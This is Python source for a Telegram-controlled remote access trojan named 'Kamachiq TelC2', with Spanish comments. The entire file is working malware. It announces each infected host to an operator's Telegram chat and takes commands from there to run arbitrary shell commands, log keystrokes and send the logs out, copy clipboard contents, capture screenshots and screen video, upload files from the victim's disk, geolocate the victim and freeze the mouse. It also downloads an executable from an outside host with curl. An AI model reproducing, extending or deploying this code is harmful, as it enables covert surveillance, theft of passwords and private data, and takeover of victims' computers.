
import importlib.util
import subprocess



# Lista de requerimientos a instalar
requirements = ["telebot", "requests", "pyautogui", "pynput", "urllib", "glob", "pyperclip", "psutil", "numpy", "opencv-python-headless"]

# Función para verificar e instalar los requisitos
def verificar_e_instalar_requerimientos():
    for req in requirements:
        spec = importlib.util.find_spec(req)
        if spec is None:
            print(f"{req} no está instalado. Instalando...")
            try:
                subprocess.check_call(["pip", "install", req , "-q"])
            except subprocess.CalledProcessError as e:
                print(f"Error al instalar {req}: {e}")
        else:
            print(f"{req} ya está instalado.")

# Verificar e instalar los requisitos al inicio del script
verificar_e_instalar_requerimientos()


import telebot
import socket, subprocess, os, platform
import requests
import json
from pynput.keyboard import Listener
import threading
import time
import platform
import pyautogui
import urllib
import glob
import base64
import pyperclip
import time
import psutil
import cv2  # Para la captura de video
import numpy as np
from pynput.mouse import Controller as MouseController

# Define el token del bot y el chat_id permitido
BOT_TOKEN = "xxxxxxxxxxxxxxxxxxxxxx;xxxxxxxxxxxxxxxxxxxxx"
CHAT_ID = "-XXXXXXXX  # Reemplaza con el chat ID del grupo que has obtenido


mouse = MouseController()
mouse_frozen = False  # Variable para controlar el estado del ratón (congelado o no)

# Función para congelar el ratón
def disable_mouse(message):
    global mouse_frozen
    mouse_frozen = True
    bot.reply_to(message, "🖱️ Ratón congelado. Utiliza /enable_mouse para descongelarlo.")

# Función para descongelar el ratón
def enable_mouse(message):
    global mouse_frozen
    mouse_frozen = False
    bot.reply_to(message, "🖱️ Ratón descongelado.")



# Hilo para mantener el ratón congelado
def keep_mouse_frozen():
    global mouse_frozen
    while True:
        if mouse_frozen:
            mouse.position = (0, 0)
        time.sleep(0.1)


# Inicia los hilos para mantener el ratón congelado y el teclado deshabilitado
threading.Thread(target=keep_mouse_frozen, daemon=True).start()



# Lista de comandos disponibles
COMANDOS = """
☠️HKN - Kamachiq☠️

Comandos disponibles Kamachiq TelC2:
"hola": ¡Hola! ¿Cómo puedo ayudarte? 👋
"dir": Lista archivos del directorio actual. 📁
"scan_ports": Escanea los puertos de la máquina. 🌐
"cd ..": Retrocede al directorio padre. 🔙
"cd [ruta]": Cambia al directorio especificado. 📂
"exec [comando]": Ejecuta comandos del sistema. 💻
"geo": Ejecuta la geolocalización. 🌍
"keylog_start": Inicia el keylogger. 🔍
"send_reg": Envía registros. 📤
"keylog_stop": Detiene el keylogger. 🛑
"send_file [ruta]": Envía un archivo específico. 📄
"screenshot": Captura de pantalla. 🖥️
"video_start": Inicia la grabación de pantalla. 🎥
"video_stop": Detiene la grabación y envía el video. ⏹️
"ip_publica": Muestra la dirección IP pública. 🌐
"help": Muestra ayuda sobre los comandos disponibles. ℹ️
"whoami": Muestra información del usuario actual. 🕵️‍♂️
"pwd": Muestra la ruta del directorio actual. 📂
"iniciar_monitoreo": Inicia el monitoreo del portapapeles. 📊
"detener_monitoreo": Detener el monitoreo del portapapeles. ⛔
"""

if not BOT_TOKEN:
    raise ValueError("Defina el Bot Token Primero")

bot = telebot.TeleBot(BOT_TOKEN)

klgr = False  # Estado inicial del keylogger
grabacion_activa = False  # Estado de la grabación de video
output_file = "output.avi"  # Archivo de salida para la grabación de video
fourcc = cv2.VideoWriter_fourcc(*"XVID")
screen_size = pyautogui.size()





# Notificar cuando se establece la conexion
def notify_connection():
    ip_publica = json.loads(urllib.request.urlopen("https://ifconfig.me/all.json").read().decode())['ip_addr']
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    message = f"✅ Campeon! tienes una Conexión establecida desde: {hostname} ({ip_address}) con IP publica ({ip_publica}) \n {COMANDOS}"
    bot.send_message(chat_id=CHAT_ID, text=message)

# Llama a la función para notificar la conexión
notify_connection()



# Comando para obtener el chat_id
@bot.message_handler(commands=['get_chat_id'])
def get_chat_id(message):
    chat_id = message.chat.id
    bot.reply_to(message, f"El chat_id es: {chat_id}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with open(message.document.file_name, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, f"Archivo {message.document.file_name} recibido y guardado.")
    except Exception as e:
        bot.reply_to(message, f"Error al recibir el archivo: {str(e)}")

# Función para listar el contenido del directorio actual
def listar_directorio(message):
    try:
        # Ejecuta el comando de shell para listar el contenido del directorio
        output = subprocess.check_output(["dir"], shell=True)
        output = output.decode('utf8', errors='ignore')
        if not output:
            bot.reply_to(message, "El directorio está vacío.")
        else:
            # Envía la salida en fragmentos de 4096 caracteres
            for z in range(0, len(output), 4096):
                bot.reply_to(message, output[z:z+4096])
    except Exception as e:
        bot.reply_to(message, f"Error al listar el directorio: {str(e)}")


# Función para cambiar de directorio y salir del directorio actual
def cambiar_directorio(message, path):
    try:
        os.chdir(path)
        curdir = os.getcwd()
        bot.reply_to(message, f"Directorio cambiado a: {curdir}")
    except Exception as e:
        bot.reply_to(message, f"No se pudo cambiar al directorio: {str(e)}")

# Funcion para escanear conexiones con netstat -an
def escanear_conexiones(message):
    try:
        # Ejecuta el comando netstat -an
        output = subprocess.check_output('netstat -an', encoding='oem', shell=True)
        if not output:
            bot.reply_to(message, "No se encontraron conexiones.")
        else:
            # Envía la salida en fragmentos de 4096 caracteres
            for z in range(0, len(output), 4096):
                bot.reply_to(message, output[z:z+4096])
    except Exception as e:
        bot.reply_to(message, f"Error al escanear conexiones: {str(e)}")

# Ejecucion de comandos CMD anteponiendo exec
def cmds(message):
    command = message.text
    if command.startswith('exec'):
        output = subprocess.getoutput(command[5:])
        if not output:
            bot.reply_to(message, "Error al ejecutar el comando.")
        else:
            for w in range(0, len(output), 4096):
                bot.reply_to(message, output[w:w+4096])

# Función para obtener la ubicación geográfica basada en la IP pública
def geolocalizacion(message):
    try:
        with urllib.request.urlopen("https://ipinfo.io/json") as url:
            data = json.loads(url.read().decode())
            link = f"http://www.google.com/maps/place/{data['loc']}"
        bot.reply_to(message, "🖱️ Clic en el siguiente enlace para conocer la ubicacion")
        bot.reply_to(message, link)
    except Exception as e:
        bot.reply_to(message, f"Error al obtener la ubicación: {str(e)}")

# Función para obtener la ubicación geográfica basada en la IP pública
def ip_publica(message):
    try:
        ip_publica = json.loads(urllib.request.urlopen("https://ifconfig.me/all.json").read().decode())['ip_addr']
        bot.reply_to(message, ip_publica)
    except Exception as e:
        bot.reply_to(message, f"Error al obtener la IP publica: {str(e)}")

def help(message):
    
    bot.reply_to(message, COMANDOS )


# Función para iniciar el keylogger
def keylogger():
    global klgr
    klgr = True
    def on_press(key):
        if klgr:
            with open('keylogs.txt', 'a') as f:
                f.write(f'{key}\n')

    with Listener(on_press=on_press) as listener:
        listener.join()

# Función para enviar los registros del keylogger
def send_logs(message):
    try:
        with open("keylogs.txt", 'r') as f:
            bot.send_document(message.chat.id, f)
            os.remove("keylogs.txt")

    except Exception as e:
        bot.reply_to(message, f"Error al enviar los registros: {str(e)}")


# Función para descargar 7-Zip ejecutable usando curl si no está presente
def download_7zip_executable():
    url = "https://www.mect.it/archive/7za.exe"
    download_path = os.path.abspath("7za.exe")
    
    # Verificar si el archivo ya está descargado
    if not os.path.exists(download_path):
        try:
            # Descargar el archivo utilizando curl si no está presente
            subprocess.run(["curl", "-L", url, "-o", download_path], check=True)
            print("7-Zip ejecutable descargado correctamente.")
        except subprocess.CalledProcessError as e:
            print(f"Error al descargar 7-Zip ejecutable: {e}")
    else:
        print("El ejecutable de 7-Zip ya está descargado.")

    return download_path

# Verificar y llamar a la función de descarga
seven_zip_executable = download_7zip_executable()

# Función para dividir el archivo utilizando 7-Zip
def split_file_with_7zip(filepath, part_size='40m'):
    command = [seven_zip_executable, 'a', f'-v{part_size}', '-tzip', f'{filepath}.zip', filepath]
    subprocess.run(command, shell=True)

# Función para enviar un archivo específico del sistema
def send_file(message, filepath):
    try:
        # Asegurar que la ruta del archivo esté correctamente escapada
        filepath = os.path.abspath(filepath)
        print(f"Intentando enviar el archivo: {filepath}")

        if os.path.exists(filepath):
            print(f"Archivo encontrado: {filepath}")
            file_size = os.path.getsize(filepath)
            print(f"Tamaño del archivo: {file_size} bytes")

            if file_size > 50 * 1024 * 1024:  # Si el archivo es mayor de 50 MB
                split_file_with_7zip(filepath)
                parts = [f for f in os.listdir() if f.startswith(f'{os.path.basename(filepath)}.zip')]
                for part in parts:
                    part_path = os.path.join(os.path.dirname(filepath), part)
                    with open(part_path, 'rb') as f:
                        success = False
                        for attempt in range(3):  # Intentar hasta 3 veces
                            try:
                                start_time = time.time()
                                bot.send_document(message.chat.id, f)
                                success = True
                                elapsed_time = time.time() - start_time
                                sleep_time = max(0, (len(f.read()) / (1024 * 1024)) - elapsed_time)
                                time.sleep(sleep_time)
                                break
                            except Exception as e:
                                bot.reply_to(message, f"Error al enviar la parte {part}: {str(e)}")
                                time.sleep(5)  # Esperar 5 segundos antes de reintentar
                        if not success:
                            bot.reply_to(message, f"No se pudo enviar la parte {part} después de 3 intentos.")
                    os.remove(part_path)  # Eliminar parte después de enviarla
            else:
                with open(filepath, 'rb') as f:
                    start_time = time.time()
                    bot.send_document(message.chat.id, f)
                    elapsed_time = time.time() - start_time
                    sleep_time = max(0, (len(f.read()) / (1024 * 1024)) - elapsed_time)
                    time.sleep(sleep_time)
        else:
            print(f"El archivo {filepath} no existe.")
            bot.reply_to(message, f"El archivo {filepath} no existe.")
    except Exception as e:
        bot.reply_to(message, f"Error al enviar el archivo: {str(e)}")
        print(f"Error al enviar el archivo: {str(e)}")






#funcion para capturar pantalla

def capturar_pantalla(message):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        with open("screenshot.png", 'rb') as f:
            bot.send_document(message.chat.id, f)
        os.remove("screenshot.png")
    except Exception as e:
        bot.reply_to(message, f"Error al capturar la pantalla: {str(e)}")

# Función para grabar video de la pantalla
def grabar_video_pantalla():
    global grabacion_activa
    out = cv2.VideoWriter(output_file, fourcc, 20.0, screen_size)
    while grabacion_activa:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
    out.release()

# Función para iniciar la grabación de pantalla
def iniciar_grabacion_pantalla(message):
    global grabacion_activa
    if not grabacion_activa:
        grabacion_activa = True
        threading.Thread(target=grabar_video_pantalla).start()
        bot.reply_to(message, "Grabación de la pantalla iniciada. \n deterner_grabacion_pantalla para finalizar la grabacion ")
    else:
        bot.reply_to(message, "¡La grabación ya está en curso!")

# Función para detener la grabación de pantalla y enviar el video
def detener_grabacion_pantalla(message):
    global grabacion_activa
    if grabacion_activa:
        grabacion_activa = False
        time.sleep(3)  # Esperar un segundo para asegurar que el archivo se cierre correctamente
        send_file(message, output_file)
        time.sleep(5)  # Esperar otro segundo antes de eliminar el archivo
        os.remove(output_file)
    else:
        bot.reply_to(message, "¡No hay grabación activa para detener!")

#ssss

# Función para obtener el usuario actual
def whoami(message):
    try:
        user = os.getlogin()
        bot.reply_to(message, f"Usuario actual: {user}")
    except Exception as e:
        bot.reply_to(message, f"Error al obtener el usuario actual: {str(e)}")

# Función para obtener el directorio actual
def pwd(message):
    try:
        directory = os.getcwd()
        bot.reply_to(message, f"Directorio actual: {directory}")
    except Exception as e:
        bot.reply_to(message, f"Error al obtener el directorio actual: {str(e)}")


# Función para verificar e instalar los requisitos
def verificar_e_instalar_requerimientos():
    for req in requirements:
        spec = importlib.util.find_spec(req)
        if spec is None:
            print(f"{req} no está instalado. Instalando...")
            try:
                subprocess.check_call(["pip", "install", req , "-q"])
            except subprocess.CalledProcessError as e:
                print(f"Error al instalar {req}: {e}")
        else:
            print(f"{req} ya está instalado.")

# Verificar e instalar los requisitos al inicio del script
verificar_e_instalar_requerimientos()

#################  FUNCION PARA MONITOREAR PORTAPAPELES ########################
# Variables globales para el monitoreo del portapapeles
monitoreo_activo = False
hilo_monitoreo = None

# Función para enviar mensaje al bot de Telegram
def enviar_mensaje_telegram(mensaje):
    try:
        bot.send_message(CHAT_ID, text=mensaje)
    except Exception as e:
        print(f"Error al enviar mensaje a Telegram: {str(e)}")

# Función para monitorear el portapapeles y enviar mensaje cuando se detecte copia
def monitor_clipboard():
    last_copied_text = ""
    while monitoreo_activo:
        copied_text = pyperclip.paste().strip()
        if copied_text and copied_text != last_copied_text:
            last_copied_text = copied_text
            enviar_mensaje_telegram(f"Texto copiado detectado: {copied_text}")
        time.sleep(1)  # Esperar un segundo antes de verificar nuevamente

# Función para iniciar el monitoreo del portapapeles
def iniciar_monitoreo(message):
    global monitoreo_activo, hilo_monitoreo
    if not monitoreo_activo:
        monitoreo_activo = True
        hilo_monitoreo = threading.Thread(target=monitor_clipboard)
        hilo_monitoreo.start()
        bot.reply_to(message, "Monitoreo del portapapeles iniciado.")
    else:
        bot.reply_to(message, "El monitoreo del portapapeles ya está activo. \n /detener_monitoreo para finalizar")

# Función para detener el monitoreo del portapapeles
def detener_monitoreo(message):
    global monitoreo_activo
    if monitoreo_activo:
        monitoreo_activo = False
        bot.reply_to(message, "Monitoreo del portapapeles detenido.")
    else:
        bot.reply_to(message, "El monitoreo del portapapeles no está activo.")



# Función para obtener información del sistema
def obtener_info_sistema(message):
    try:
        info = {}
        info["hostname"] = socket.gethostname()
        info["ip"] = socket.gethostbyname(info["hostname"])
        info["cpu_cores"] = psutil.cpu_count(logical=False)
        info["cpu_threads"] = psutil.cpu_count(logical=True)
        info["memory"] = psutil.virtual_memory().total / (1024**3)
        info["disk"] = psutil.disk_usage('/').total / (1024**3)
        info["partitions"] = [p.device for p in psutil.disk_partitions()]
        info["os"] = platform.system()
        info["os_version"] = platform.version()

        interfaces = psutil.net_if_addrs()
        interfaces_info = []
        for interface, addrs in interfaces.items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    interfaces_info.append((interface, addr.address))

        info["interfaces"] = interfaces_info

        mensaje = (
            f"Hostname: {info['hostname']}\n"
            f"IP: {info['ip']}\n"
            f"CPU Cores: {info['cpu_cores']}\n"
            f"CPU Threads: {info['cpu_threads']}\n"
            f"Memoria (GB): {info['memory']:.2f}\n"
            f"Disco Duro (GB): {info['disk']:.2f}\n"
            f"Particiones: {', '.join(info['partitions'])}\n"
            f"Sistema Operativo: {info['os']}\n"
            f"Versión del SO: {info['os_version']}\n"
            f"Interfaces de Red:\n"
        )

        for interface, ip in info["interfaces"]:
            mensaje += f" - {interface}: {ip}\n"

        bot.reply_to(message, mensaje)
    except Exception as e:
        bot.reply_to(message, f"Error al obtener información del sistema: {str(e)}")




# Manejador para todos los mensajes
#@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global klgr  # Declarar klgr como global para poder modificarla
    chat_id = message.chat.id
    print(f"Mensaje recibido del chat: {chat_id}")  # Imprime el chat_id para depuración
    if str(chat_id) == CHAT_ID:  # Verifica si el chat_id es el permitido
        print(f"Mensaje recibido del chat permitido: {chat_id}")
        if message.text.lower() == "hola":
            bot.reply_to(message, "¡Hola! ¿Cómo puedo ayudarte?")
        elif message.text.lower() == "dir":
            listar_directorio(message)
# escan de puertos listener y activos
        elif message.text.lower() == "scan_ports":
            escanear_conexiones(message)
# salir de directorio
        elif message.text.lower() == "cd ..":
            cambiar_directorio(message, "..")
# cambiar de directorio
        elif message.text.lower().startswith("cd "):
            path = message.text[3:]
            cambiar_directorio(message, path)
# Ejecutar comandos CMD anteponiendo exec
        elif message.text.lower().startswith("exec "):
            cmds(message)
#ejecutar Geolocalizacion
        elif message.text.lower() == "geo":
            geolocalizacion(message)
#executa keyylogger2
        elif message.text.lower() == "keylog_start":
            klgr = True
            bot.reply_to(message, "La sesión del keylogger ha comenzado.")
            threading.Thread(target=keylogger).start()  # Iniciar keylogger en un hilo separado
        elif message.text.lower() == "send_reg":
            send_logs(message)
        elif message.text.lower() == "keylog_stop":
            klgr = False
            bot.reply_to(message, "La sesión del keylogger ha terminado.")#enviar archivo
        elif message.text.lower().startswith("send_file"):
            filepath = message.text[10:].strip()  # Obtener la ruta del archivo del mensaje
            send_file(message, filepath)
        elif message.text.lower() == "screenshot":
            capturar_pantalla(message)
        elif message.text.lower() == "video_start":
            iniciar_grabacion_pantalla(message)
        elif message.text.lower() == "video_stop":
            detener_grabacion_pantalla(message)
        elif message.text.lower() == "ip_publica":
            ip_publica(message)
        elif message.text.lower() == "help":
            help(message)      
        elif message.text.lower() == "whoami":
            whoami(message)
        elif message.text.lower() == "pwd":
            pwd(message)
        elif message.text.lower() == "dir":
            listar_directorio(message)
        elif message.text.lower() == "iniciar_monitoreo":
            iniciar_monitoreo(message)
        elif message.text.lower() == "detener_monitoreo":
            detener_monitoreo(message)
        elif message.text.lower() == "info_sistema":
            obtener_info_sistema(message)
        elif message.text.lower() == "disable_mouse":
            disable_mouse(message)
        elif message.text.lower() == "enable_mouse":
            enable_mouse(message)
    else:
        bot.reply_to(message, "🚫 Acceso denegado. No tienes permiso para usar este bot.")
        print(f"Acceso denegado para el chat: {chat_id}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    handle_message(message) 




# Inicia el bot
bot.polling()

